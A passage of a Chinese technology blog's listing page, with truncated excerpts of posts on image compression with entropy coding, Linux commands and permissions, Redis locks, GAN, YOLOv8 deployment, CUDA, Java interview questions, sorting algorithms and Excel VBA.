优势 高压缩比：通过利用像素间的相关性，条件熵编码能够实现高压缩比，即压缩后的数据量远小于原始图像。自适应性：编码过程可以根据图像内容的统计特性自适应地调整，从而更有效地压缩不同类型的图像。无损或有损压缩：该框架可以支持无损压缩（完美重建原始图像）和有损压缩（以一定质量的损失换取更高的压缩比）。 劣势 计算复杂度：条件熵编码通常需要复杂的计算来分析像素间的相关性，并构建预测模型。编码延迟：由于编码过程依赖于已编码的数据，因此可能存在编码延迟，特别是在实时应用中。对噪声和失真的敏感性：如果图像包含大量噪声或失真，可能会影响预测模型的准确性，从而降低压缩效率。 关键技术 预测模型：构建有效的预测模型来捕捉像素间的相关性，这是实现高效压缩的关键。量化：将预测误差量化为有限的离散值，以减少编码所需的比特数。熵编码：应用如算术编码或霍夫曼编码等熵编码技术来进一步压缩量化后的数据。率失真优化：在有损压缩中，平衡压缩率和重建图像的质量，以达到最佳的整体性能。 框架组成部分及阐述 预测器：负责根据已编码的数据预测当前要编码的数据。预测器可以基于简单的线性模型或复杂的机器学习模型。量化器：将预测误差映射到有限的离散值集合中，以减少表示误差所需的比特数。量化过程通常是有损的，会引入一定的失真。熵编码器：应用熵编码技术来压缩量化后的数据。熵编码器根据数据的统计特性分配不同长度的代码，以实现最优的压缩效果。解码器：执行与编码器相反的操作，利用预测模型、量化步长和熵解码技术来重建原始图像。解码器是压缩过程中不可或缺的一部分，确保压缩后的数据可以被正确解码和使用。 这些组成部分共同协作，在基于条件熵编码的框架中实现高效的图像压缩。通过不断优化预测模型、量化策略和熵编码技术，可以进一步提高压缩效率和重建图像的质量。
为了更详细地描述基于条件熵编码的图像压缩框架，我们将通过以下几个部分来进一步阐述：框架的详细工作流程、实际应用中的实例，以及一个简单的Python代码片段来展示条件熵编码的基本概念。
框架的详细工作流程 数据准备：首先，需要对待压缩的图像进行预处理，比如颜色空间转换（从RGB转到YCbCr等）、下采样等，以适应编码器的需求。
预测模型构建：基于条件熵编码的框架中，预测模型是关键。它通常通过分析已编码像素来预测当前像素的值。这个模型可以是简单的线性预测（如DPCM，差分脉冲编码调制），也可以是复杂的非线性模型（如神经网络）。
预测与残差计算：使用预测模型对当前像素进行预测，并计算预测值与真实值之间的残差（或称为预测误差）。
量化：将残差量化为有限的离散值，以减少表示这些值所需的比特数。量化步长（即每个离散值代表的区间大小）可以根据所需的压缩率和图像质量进行调整。
熵编码：对量化后的残差进行熵编码，如使用霍夫曼编码或算术编码，进一步压缩数据。
比特流生成：编码器将编码后的数据（包括预测模型参数、量化步长和熵编码后的残差）打包成比特流，准备存储或传输。
解码与重建：解码器接收比特流，并反向执行编码器的步骤来重建图像。这包括解熵编码、反量化、使用预测模型重建像素值等。
实际应用中的实例 一个著名的基于条件熵编码的图像压缩标准是JPEG 2000，它采用了小波变换和EBCOT（嵌入式块编码与优化截断）算法。在JPEG 2000中，图像首先被分解成多个子带，每个子带代表不同的频率和方向信息。然后，对每个子带进行量化和熵编码，生成压缩的比特流。
另一个例子是HEVC（高效视频编码）标准中的CABAC（基于上下文的自适应二进制算术编码），它利用已编码的相邻像素来预测当前像素的概率分布，并使用算术编码对预测残差进行压缩。
Python代码片段 以下是一个简化的Python代码片段，展示了如何使用条件熵编码对一维信号（可以看作图像的简化版本）进行压缩。这里我们使用简单的DPCM预测和霍夫曼编码作为示例。
import numpy as np from collections import defaultdict import heapq from struct import pack, unpack # 假设我们有一个简单的8位灰度图像（一维信号） image = np.array([120, 123, 124, 125, 126, 127, 128, 129], dtype=np.uint8) # DPCM预测 def dpcm_encode(image): encoded = np.empty_like(image) encoded[0] = image[0] for i in range(1, len(image)): encoded[i] = image[i] - image[i-1] # 计算差值 return encoded # 霍夫曼编码 def huffman_encode(symbols, probabilities): heap = [[weight, [symbol, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/205943300a08775f6da556c9d063f57a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f9c6ec6a5df1df11ab04b8982ab6b86/" rel="bookmark">
			Linux shell编程学习笔记41：lsblk命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		边缘计算的挑战和机遇 边缘计算面临着数据安全与隐私保护、网络稳定性等挑战，但同时也带来了更强的实时性和本地处理能力，为企业降低了成本和压力，提高了数据处理效率。因此，边缘计算既带来了挑战也带来了机遇，需要我们不断地研究
0 前言 前几节学习我们均涉及到磁盘和文件存储，今天我们研究与块设备有关的命令。
1 lsblk命令的功能和格式 我们可以使用命令 lsblk --help命令 查看它的用法：
purpleEndurer @ bash $ lsblk --help
Usage:
lsblk [options] [&lt;device&gt; ...]
Options:
-a, --all print all devices
-b, --bytes print SIZE in bytes rather than in human readable format
-d, --nodeps don't print slaves or holders
-D, --discard print discard capabilities
-e, --exclude &lt;list&gt; exclude devices by major number (default: RAM disks)
-I, --include &lt;list&gt; show only devices with specified major numbers
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f9c6ec6a5df1df11ab04b8982ab6b86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/daa096166d2dadfeb17091fa7b46222b/" rel="bookmark">
			线性代数：矩阵运算（加减、数乘、乘法、幂、除、转置）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
加减
数乘
矩阵与矩阵相乘
矩阵的幂
矩阵转置 方阵的行列式 方阵的行列式，证明：|AB| = |A| |B|
加减 数乘 矩阵与矩阵相乘 矩阵的幂 矩阵转置 方阵的行列式 方阵的行列式，证明：|AB| = |A| |B| 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ffe559cfd84a45b604085743f2ccb26/" rel="bookmark">
			Linux权限理解（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		粘滞位 当你想和你的搭档同时管理一个文件夹时（该目录的属性为rwx时），又害怕被其他人恶意删除文件这是你就可以为目录添加一个粘滞位属性。
当一个目录被设置为"粘滞位"(用chmod +t),则该目录下的文件只能由
一、超级管理员删除
二、该目录的所有者删除
三、该文件的所有者删除
例：
这样操作后，其他人就不能随意删除目录中的文件了
关于权限的总结 1.目录的可执行权限是表示你可否在目录下执行命令。
2.如果目录没有-x权限，则无法对目录执行任何命令，甚至无法cd 进入目, 即使目录仍然有-r 读权限（这个地方很容易犯错，认为有读权限就可以进入目录读取目录下的文件）
3.而如果目录具有-x权限，但没有-r权限，则用户可以执行命令，可以cd进入目录。但由于没有目录的读权限，所以在目录下，即使可以执行ls命令，但仍然没有权限读出目录下的文档。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34fc25c8c51257ae7bb0d2cc9ff33bc9/" rel="bookmark">
			web架构师编辑器内容-图层拖动排序功能的开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新的学习方法 用手写简单方法实现一个功能然后用比较成熟的第三方解决方案即能学习原理又能学习第三方库的使用 从两个DEMO开始 Vue Draggable Next: Vue Draggable NextReact Sortable HOC: React Sortable HOC 列表排序的三个阶段 拖动开始（dragstart） 被拖动图层的状态变化会出一个浮层 拖动进行中(dragmove) 浮层会随着鼠标移动条目发生换位：当浮层下沿超过被拖条目二分之一的时候，触发换位。这是一个比较独特的需求 松开鼠标阶段（drop） 浮层消失被拖动图层状态复原数据被更新
拖动排序功能开发 第一阶段 Dragstart
被拖动图层的状态变化 常规做法 添加mouseDown事件，检查当前的target是那个元素，然后给他添加特定的状态添加mouseMove事件，创一个和被拖动元素一模一样的的浮层，将它的定位设置
它的定位为绝对定位，并且随着鼠标的坐标更新。 使用HTML的Drag特性 文档地址：拖拽操作浏览器的默认拖拽行为：支持图象，链接和选择的文本其他元素默认情况是不可拖拽的。如果想可以拖拽可以设置为draggable = true使用dragstart事件监控拖动开始，并设置对应的属性 LayerList组件中添加draggable属性
// LayerList.vue &lt;li class="ant-list-item" v-for="item in list" :key="item.id" :class="{ active: item.id === selectedId }" @click="handleClick(item.id)" draggable="true" &gt;&lt;/li&gt; 这样就可以有效果了：当拖动对应条目的时候，它会自动生成半透明的条目，并且跟随鼠标的移动。
接下来就开始使用dragstart事件监控拖动开始，并设置对应的属性
给被拖动元素添加特定的状态：使用一系列的事件来监控拖动的进度，使用dragStart开始拖动操作 // LayerList.vue // html部分 &lt;li class="ant-list-item" v-for="item in list" :key="item.id" :class="{ active: item.id === selectedId, ghost: dragData.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34fc25c8c51257ae7bb0d2cc9ff33bc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30666f85e1a45d109c62c32078279609/" rel="bookmark">
			Redis高并发分布式锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
场景描述
订单扣减场景举例
代码调整1
代码调整2
代码调整3
redisson锁续命核心代码
场景描述 订单扣减场景举例 //首先在redis中set stock 300 @RequestMapping("/deduct_stock") public String deductStock() { int stock = Integer.parseInt(stringRedisTemplate.opsForValue().get("stock")); // jedis.get("stock") if (stock &gt; 0) { int realStock = stock - 1; stringRedisTemplate.opsForValue().set("stock", realStock + ""); //jedis.set(key,value) System.out.println("扣减成功，剩余库存:" + realStock); } else { System.out.println("扣减失败，库存不足"); } return "end"; } 以上场景肯定会出现并发问题，当有多个用户同时进行库存扣减的时候，可能在获取stock数量的时候获取到相同的值，有可能会出现此时只有一件库存，但是三个用户下单，出现库存超卖问题。
代码调整1 @RequestMapping("/deduct_stock") public String deductStock() { synchronized (this){ int stock = Integer.parseInt(stringRedisTemplate.opsForValue().get("stock")); // jedis.get("stock") if (stock &gt; 0) { int realStock = stock - 1; stringRedisTemplate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/30666f85e1a45d109c62c32078279609/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83d002f703e42f29c4e85cf02bce51c0/" rel="bookmark">
			第四十周：文献阅读&#43;GAN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
摘要
Abstract
文献阅读：结合小波变换和主成分分析的长短期记忆神经网络深度学习在城市日需水量预测中的应用
现有问题
创新点
方法论
PCA（主要成分分析法）
DWT（离散小波变换）
DWT-PCA-LSTM模型
研究实验
实验目的
数据集
评估指标
实验设计
实验结果分析
Generative adversarial network（GAN生成对抗网络）
GAN的基本概念
GAN训练目标
生成器的训练目标
鉴别器的训练目标
GAN的目标函数
GAN的数学原理
GAN实现生成
总结
摘要 本周阅读的文献，提出了一种结合离散小波变换(DWT)和主成分分析(PCA)预处理技术的混合长短期记忆模型。其中采用DWT法消除需水量序列的噪声成分，采用主成分分析方法选择需水量影响因子中的主成分。此外，建立了两个LSTM网络，利用DWT和PCA技术的结果进行城市日需水量预测。最后通过与其他基准预测模型的比较，证明了该模型的优越性。GAN中主要包括生成器和辨别器，其中生成器对应于深度学习中的生成模型，而辨别器对应于分类模型，两者相互对抗而不断优化。GAN的训练目标是想要生成分布与真实分布越接近越好，通过辨别器优化可以衡量两者之间的JS散度，从而最小化散度值，使两个分布达到更接近。
Abstract The literature read this week proposes a hybrid long short-term memory model that combines discrete wavelet transform (DWT) and principal component analysis (PCA) preprocessing techniques. The DWT method is used to eliminate the noise components in the water demand sequence, and the principal component analysis method is used to select the principal components in the influencing factors of water demand.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83d002f703e42f29c4e85cf02bce51c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23e7daa50989587ae5415b39a3ca9b78/" rel="bookmark">
			【腾讯云】您使用的腾讯云服务存在违规信息，请尽快处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		收到【腾讯云】您使用的腾讯云服务存在违规信息，请尽快处理，如何解决？在腾讯云服务器部署网站提示网站有违规信息如何处理？腾讯云百科txybk告诉各位站长，在腾讯网址安全中心申诉，申诉通过后截图上传给腾讯云客服即可解封。
腾讯云百科网在腾讯云服务器上部署的网站，突然收到腾讯云站内信，提示我的腾讯云服务存在违规信息，如下：
【腾讯云】您使用的腾讯云服务存在违规信息，请尽快处理
尊敬的腾讯云用户，您好！
您的腾讯云账号（账号ID: 10， 昵称: 腾讯云）下的CVM服务存在违规信息，请您第一时间完成违规信息处理，避免违规资源43.1.1.18被封禁，影响您的业务运营。感谢您的理解和支持！
违规URL：
违规域名：无
违规标识：
解决方法如下：
1、先检查你的违规URL，是否真的违规？如果违规了，请及时整改；
2、将确认非违规的URL，提交到腾讯安全-网址安全中心进行申诉，申诉链接https://urlsec.qq.com/complain.html
3、申诉成功后，将申诉成功的截图，通过提交工单的形式给腾讯云客服处理即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/009c69623cad9b75a764422a499a9401/" rel="bookmark">
			周同学文章汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言1. C++2. Linux3. 环境配置4. Algo C++5. Makefile6. 模型部署7. tensorRT从零起步高性能部署8. 保姆级从零手写自动驾驶CV9. 剪枝与重参10. 量化11. 国内首个BVE感知全栈系列学习教程12. CUDA与TensorRT部署实战课程 前言 随着博主记录的笔记越来越多，查找也越来越困难，有时自己都要找半天，所以这边记录下博主发布的所有文章，方便管理，以专栏为划分，后续有新的文章也会添加进来😄
1. C++ 本专栏原本是想记录刷题的一些过程的，后来…😂
专栏地址：https://blog.csdn.net/qq_40672115/category_12039077.html
C++字符串与字符数组详解 2. Linux 本专栏主要记录 Linux 和 vscode 的一些指令
专栏地址：https://blog.csdn.net/qq_40672115/category_11958715.html
Ubuntu常用命令SSH和VScode远程开发VScode常用指令从零Makefile落地算法大项目Jetson nano开机自启动程序 3. 环境配置 本专栏主要记录一些项目的环境配置和常用软件的安装
专栏地址：https://blog.csdn.net/qq_40672115/category_12093997.html
Ubuntu20.04软件安装大全Lidar AI Solution环境配置Visual Studio 2017安装和项目配置 4. Algo C++ 杜老师推出的面向 AI 算法的 C++ 课程笔记，讲得是真滴好，可惜没后续了
专利地址：https://blog.csdn.net/qq_40672115/category_12297296.html
AlgoC++：课程介绍AlgoC++第一课：求解根号2AlgoC++第二课：线性回归AlgoC++第三课：C++世界观AlgoC++第四课：逻辑回归AlgoC++第五课：基于矩阵的算法实现AlgoC++第六课：BP反向传播算法AlgoC++第七课：手写MatrixAlgoC++第八课：手写BPAlgoC++第九课：手写AutoGradAlgoC++：课程总结 5. Makefile 本专栏主要记录博主学习杜老师推荐的 Makefile 教程的一些笔记
专栏地址：https://blog.csdn.net/qq_40672115/category_12263266.html
Makefile第一课：介绍Makefile第二课：简单编译原理Makefile第三课：C语言的编译Makefile第四课：C++的编译Makefile第五课：Makefile介绍Makefile第六课：Makefile变量Makefile第七课：Makefile常用符号Makefile第八课：Makefile常用函数Makefile第九课：Makefile条件控制Makefile第十课：Makefile编译Makefie第十一课：Makefile静态库Makefile第十二课：Makefile动态库Makefile库文件详解Makefile实战从零Makefile落地算法大项目 6. 模型部署 本专栏偏实战，主要记录博主在嵌入式/服务器端部署模型的一些过程以及学到的一些部署知识
专栏地址：https://blog.csdn.net/qq_40672115/category_11970990.html
Jetson嵌入式系列模型部署-1
Jetson嵌入式系列模型部署-2
Jetson嵌入式系列模型部署-3
Jetson nano部署YOLOv7
Jetson nano部署YOLOv8
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/009c69623cad9b75a764422a499a9401/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/237d49f9e80ebcf54ddd876809e63192/" rel="bookmark">
			YOLOv8-OBB推理详解及部署实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、YOLOv8-OBB推理(Python)1. YOLOv8-OBB预测2. YOLOv8-OBB预处理3. YOLOv8-OBB后处理4. YOLOv8-OBB推理 二、YOLOv8-OBB推理(C++)1. ONNX导出2. YOLOv8-OBB预处理3. YOLOv8-OBB后处理4. YOLOv8-OBB推理 三、YOLOv8-OBB部署1. 源码下载2. 环境配置2.1 配置CMakeLists.txt2.2 配置Makefile 3. ONNX导出4. 源码修改5. 运行 四. 拓展-ProbIoU1. Gaussian Bounding Boxes(GBB)2. ProbIoU3. 代码 结语下载链接参考 前言 梳理下 YOLOv8-OBB 的预处理和后处理流程，顺便让 tensorRT_Pro 支持 YOLOv8
注：为了不必要的错误，下面我们以 YOLOv8 的固定版本 v8.1.0 来演示说明
参考：https://github.com/shouxieai/tensorRT_Pro
实现：https://github.com/Melody-Zhou/tensorRT_Pro-YOLOv8
一、YOLOv8-OBB推理(Python) 1. YOLOv8-OBB预测 我们先尝试利用官方预训练权重来推理一张图片并保存，看能否成功
在 YOLOv8 主目录下新建 predict-obb.py 预测文件，其内容如下：
import cv2 import torch import numpy as np from ultralytics import YOLO def xywhr2xyxyxyxy(center): # reference: https://github.com/ultralytics/ultralytics/blob/v8.1.0/ultralytics/utils/ops.py#L545 is_numpy = isinstance(center, np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/237d49f9e80ebcf54ddd876809e63192/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c12fb61ffa3cfb7e85a7897ca39bacf/" rel="bookmark">
			CUDA基础教程文档记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言0. CUDA基础语法1. CUDA共享内存2. GPU架构简介3. CUDA内存子系统4. 原子/规约操作和warp shuffle5. CUDA统一内存(Managed Memory)6. CUDA流和并发7. Profiler驱动的优化 前言 学习手写 AI 中 HY 大佬的《CUDA基础教程》八讲视频，由于没有文档，所以手动记录下，仅供自己参考
部分实战代码讲解部分并没有记录，建议大家观看原视频，视频链接
文档配合视频，食用更佳🤗
感谢 HY 大佬的分享😄
0. CUDA基础语法 CUDA 语言版本：cuda c++/cuda Fortran/cuda Python/cuda Matlab，本文档 cuda 讲解 cuda c++，遵守 c++ 标准
GPU 和 CPU 异构计算：计算密集型 -&gt; GPU，逻辑流控制 -&gt; CPU
Typical workflow:
a. 先把数据从 CPU 内存拷到 GPU 显存上b. 执行 GPU 程序计算，以多个线程 (gridDim * blockDim) 一起计算 SIMT 的方式c. 把结果从 GPU 显存中拷回 CPU 内存里 host 和 device 内存物理上是隔离的，设备指针（device pointer/gpu pointer）指向 GPU 显存地址，无法在 CPU 端解引用。主机指针（host pointer/cpu pointer）指向 CPU 内存地址，无法在 GPU 端解引用。需要用 cudaMalloc()，cudaFree()。cudaMemcpy()… 这些 CUDA API 来实现对设备显存的操作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c12fb61ffa3cfb7e85a7897ca39bacf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2627e54bd604b405a455ed1f0537446/" rel="bookmark">
			大模型镜像打包实战:CodeGeeX2为例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		资源地址 docker torch镜像地址
CodeGeeX2 github
构建思路 查看CodeGeeX2项目，官方已经提供好启动脚本，配置好各种依赖应该就可以运行。
python ./demo/run_demo.py usage: run_demo.py [-h] [--model-path MODEL_PATH] [--example-path EXAMPLE_PATH] [--quantize QUANTIZE] [--chatglm-cpp] [--fastllm] [--n-gpus N_GPUS] [--gpu GPU] [--cpu] [--auth] [--username yourname] [--password yourpassword] [--port PORT] [--listen ADDRESS] # 若要启用身份验证，请先启用--auth，然后定义--username与--password，如： python run_demo.py --auth --username user --password password # 若要监听所有地址请指定 --listen 0.0.0.0 镜像Dockerfile 写一个启动脚本bin/start.sh，判断是否启用身份验证，也可以在Dockerfile最后的CMD直接执行python脚本，sh bin/start.sh这样写更标准。
#!/usr/bin/env bash if [[ $USERNAME != "" ]] &amp;&amp; [[ $PASSWORD != "" ]] then python /workspace/CodeGeeX2/demo/run_demo.py \ --listen $LISTEN --port $PORT \ --model-path $MODEL_PATH \ --gpu $GPU \ --n-gpus $N_GPUS \ $CHATGLM \ --auth \ --username $USERNAME \ --password $PASSWORD else python /workspace/CodeGeeX2/demo/run_demo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2627e54bd604b405a455ed1f0537446/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/176f9616e0b128c5f2bb342923b4e8b0/" rel="bookmark">
			基于ssm&#43;jsp的java植物园管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java植物园盆栽销售商城系统是一个基于Web的在线销售系统，旨在提供植物园盆栽的销售、管理和支付等功能。系统提供了管理员、网站用户、植物类型、植物商品、植物入园、植物出园、订单、用户留言/回复、新闻资讯等功能展示。源码来源于：基于ssm+jsp的java植物园管理系统
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43a77f7022d8532c076a733919c77a89/" rel="bookmark">
			【高频核心】大厂java八股文总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：笔者认为，面试中最重要的不是你回答出了多少问题，而是自信！在听完面试官的问题时，不要立刻回答，停顿三秒。一来给面试官留下你在思考的印象，二来有个整理思路的时间，让回答更有逻辑性。
文章目录 一、Java基础面试题1、面向对象2、HashMap底层原理3、 ==和equals（常见于笔试）4、 ArrayList 和LinkedList区别 二、Java并发面试题1、 ThreadLocal2、synchronized相关问题3、 多线程（线程池）4、并发相关问题 三、mysql相关问题1、Mysql索引2、数据库分库分表3、数据库事务4、Mysql其他问题 四、JVM虚拟机1、JVM常问面试题2、JVM进阶面试题 五、Redis面试题1 、缓存雪崩、缓存穿透、缓存击穿2、 如何保证数据库和Redis的数据一致性3、Redis的数据结构及使用场景4、Redis持久化机制有哪些5、Redis其他常见问题 六、SSM和SpringBoot1、Spring相关问题2、SpringMVC执行流程3、Springboot自动装配原理 七、网络与IO面试题1、网络 八、消息中间件1、Kafka2、RocketMQ3、Kafka与RocketMQ的对比 九 、设计模式 一、Java基础面试题 1、面向对象 1.1 面向对象和面向过程的区别？
面向过程，是站在计算机的角度出发，以代码执行过程为核心，考虑到让计算机先做什么、再做什么。而面向对象，是站在人的角度，从现实生活出发。比如一个司机和车，是use a 的关系，不管司机开不开车，车这个对象都要有能跑的属性。说白了，人们生活中解决问题的思路其实就是面向对象。
1.2 面向对象的三大特性？
封装：核心思想就是“隐藏细节”，对外提供访问属性的方法。保证了数据的安全和程序的稳定。继承：将子类共性的属性或者方法抽取出来成为父类，子类继承后就不用重复定义父类的属性和方法，只需要扩展自己的个性化。强制继承父类非私有的属性和方法，破坏了封装性原则。多态：基于对象所属类的不同，外部对同一个方法的调用，实际执行的逻辑不同。
继承，方法重写，父类指向子类对象。无法调用子类特有的功能； 父类类型 变量名=new 子类对象
变量名.方法名（）
笔者在看设计模式和spring源码时，对面向对象有了进一步的认识。如果说封装和继承是面向对象的基石，那么多态则是面向对象的具体使用。编译看左边，运行看右边。 在日常书写代码时，尽量使用List list=new ArrayList();这种形式，左边为抽象父类，右边为具体的实现子类。这样的书写方式，不仅代码兼容性更好而且具体的实现细节由具体的对象去执行完成，这才是面向对象的初衷和设计核心！
2、HashMap底层原理 2.1 什么是哈希表？哈希冲突？如何处理哈希冲突？
1）、什么是哈希表？
如何在一个无序的线性表中查找一个数据元素？答：对着线性表遍历！但这样时间复杂度会很高，查找耗费性能。那有没有这样一种数据结构，数据结构中的元素和它所在位置有一个对应关系，这样就可以通过元素找到它的位置，时间复杂度就降低了。这种数据结构就是哈希表！
哈希表又叫散列表，通过映射函数f(key)将一组数据散列存储在数组中的一种数据结构。在哈希表中，每个key和它所在位置都有一个映射关系，可以通过f(key)来轻易找到。比如映射关系f(key)=key/11;
2）、什么是哈希冲突（哈希碰撞）？
比如f(key)=key/11，当值为key为6和72时，余数都是6，72该怎么存呢？这就是哈希冲突！
3）、如何减少哈希冲突？
哈希冲突不可避免，但能减少！这里提供几种最容易理解的几种解决方案：
1）再哈希法：选取若干个不同的哈希函数，当发生哈希冲突时，执行另外的哈希函数，直至不冲突为止。
2）链地址法（最常用！！！）：这个就是与红黑树相关了！当我们出现[48,15,26,4,70,82,59，28，6，17]。我们这组数据仍然散列存储到长度为11的数组中，出现多个能被11整除的元素时（6，28，17），就会在第一个余数为6的元素下依次挂上，即形成所谓的链表！但链表太长查询效率又会降低，为了优化时间复杂度，当链表长度大于8时，会形成红黑树（可自平衡的二叉红黑树）
4）、哈希表的扩容与Rehash
在链表长度不变的情况下，插入元素越多，越容易哈希冲突。这时就进行扩容，当装载因子填充到一定数值（一般选0.75），就进行2倍扩容，然后将原来的数据重新装到新的扩容好的数组中（该过程即Rehash）
2.2 hashmap为什么是线程不安全的？
在并发下put数据，会发生数据覆盖、数据错乱。hashtable用的是synchronized关键字，而ConcurrentHashMap在jdk1.7之前是用了粒度更小的分段锁，1.8之后用的是synchronized+cas锁。
cas锁：没有获取到锁的线程不会阻塞，而是会循环控制不断获取锁。
2.3 HashMap扩容机制
jdk1.7，是数组+链表，扩容时会新生成一个数组，遍历老数组的每个链表上的元素，取每个元素的key，基于新数组的长度，计算出在新数组中的位置，将元素添加进去；
jdk1.8,是数组+链表+红黑树，扩容与jdk1.7时大致相同，不同的是，一棵红黑树进行计算时可能在新的数组中形成2个链表或是1个链表+1个红黑树。
2.4 说一下HashMap的Put（）方法？
在jdk1.7和jdk1.8，都是先根据key哈希计算出在数组中的位置。
1、如果数组下标为空，则将key和value封装成一个Entry对象（jdk1.7是Entry对象，jdk1.8是Node对象），直接添加。2、数组下标不为空，jdk1.7先判断是否需要扩容，不需要则通过头插法插入到链表中；jdk1.8,先判断当前Node节点上是红黑树还是链表，先生成一个Node节点通过尾插法进行插入，然后在进行扩容判断，不需要扩容则结束Put()。 2.5 CorrentHashMap()如何保证线程安全？
并发工具类-ConcurrentHashMap1.7原理
并发工具类-ConcurrentHashMap1.8原理
jdk1.8时的总结 :
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43a77f7022d8532c076a733919c77a89/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e702b583d44431d5376426aba4179fe0/" rel="bookmark">
			briefly describe the classic sorting algorithm
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		catalog Quick SortingStepsImplementation Heap SortingStepsImplementation Merge SortingStepsImplementation Quick Sorting The worst-case Scenario for quick sorting is O(n2), such as quick sorting of sequential sequences, but its average expected time is O(nlogn).
Steps Select an element from the sequence and call it a pivot.Reorder the sequence, placing all items smaller than the pivot before the pivot and those larger than the pivot after the pivor. This is called partitioning operation.Recursively sort subsequence that is less than the pivot and subsequence that is greater than the pivot.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e702b583d44431d5376426aba4179fe0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e56e0ca0ef641cba64fcb9df8fbddc0/" rel="bookmark">
			Excel·VBA合并工作簿2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		其他合并工作簿的方法，见之前的文章《Excel·VBA合并工作簿》 目录 8，合并文件夹下所有工作簿中所有工作表，按表头汇总8.1，打开工作簿方法举例 8.2，SQL方法举例 8，合并文件夹下所有工作簿中所有工作表，按表头汇总 8.1，打开工作簿方法 与之前的文章《Excel·VBA合并工作簿（3，合并文件夹下所有工作簿中所有工作表）》类似，但是按照表头名称，将表格数据汇总至合并表格，表头名称相同的在同一列
Sub 合并文件夹下所有工作簿中所有工作表_按表头汇总() '文件夹下所有工作簿wb所有工作表ws合并保存至新建工作表（但不含子文件夹），并按表头汇总数据，默认只有1行表头 Dim dict As Object, fso As Object, write_ws As Worksheet, wb As Workbook, sht As Worksheet Dim write_row&amp;, write_col&amp;, sht_row&amp;, file_path$, file_name$, old_name As Boolean, arr, i&amp;, k '--------------------参数填写：file_path，待合并工作簿所在的文件夹；old_name file_path = "E:\测试\拆分表\合并工作簿8\" file_name = Dir(file_path &amp; "*.xlsx") old_name = True '写入原工作簿、工作表名称，是/否 Application.ScreenUpdating = False '关闭屏幕更新，加快程序运行 Application.DisplayAlerts = False '不显示警告信息 Set dict = CreateObject("scripting.dictionary"): tm = Timer Set fso = CreateObject("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e56e0ca0ef641cba64fcb9df8fbddc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2714a41dacaf7c78bdc222bfa46d0c2/" rel="bookmark">
			几种排序算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
冒泡排序
冒泡排序的思想
冒泡排序的实现
例题 蓝桥OJ3225 宝藏排序1
问题描述
输入描述
输出描述
样例输入
样例输出
快速排序
快速排序的思想
快速排序的实现
例题 蓝桥oj 宝藏排序2
问题描述
输入描述
输出描述
样例输入
